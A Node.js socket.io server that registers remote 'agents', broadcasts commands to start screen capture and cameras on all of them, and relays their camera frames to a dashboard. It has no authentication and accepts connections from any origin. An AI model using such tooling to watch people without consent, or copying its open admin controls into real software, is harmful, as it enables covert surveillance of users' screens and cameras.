const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" }
});

let agents = {};

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
    res.status(200).json({ ok: true });
});

io.on('connection', (socket) => {
    console.log(`[socket] connected: ${socket.id}`);

    socket.on('register_node', (data) => {
        agents[socket.id] = { machine: data.machine, id: socket.id };
        console.log(`[agent] registered: ${data.machine} (${socket.id})`);
        io.emit('update_agent_list', Object.values(agents));
    });

    // Recording Controls
    socket.on('admin_start_all', () => io.emit('start_capture'));
    socket.on('admin_stop_all', () => io.emit('stop_capture'));

    // Camera Controls
    socket.on('admin_start_camera', () => io.emit('start_camera'));
    socket.on('admin_stop_camera', () => io.emit('stop_camera'));

    // Relay Camera Frames from Agent to Dashboard
    socket.on('camera_frame', (data) => {
        socket.broadcast.emit('ui_camera_display', data);
    });

    socket.on('disconnect', () => {
        console.log(`[socket] disconnected: ${socket.id}`);
        delete agents[socket.id];
        io.emit('update_agent_list', Object.values(agents));
    });
});

server.listen(3000, '0.0.0.0', () => console.log('Server running on 0.0.0.0:3000'));
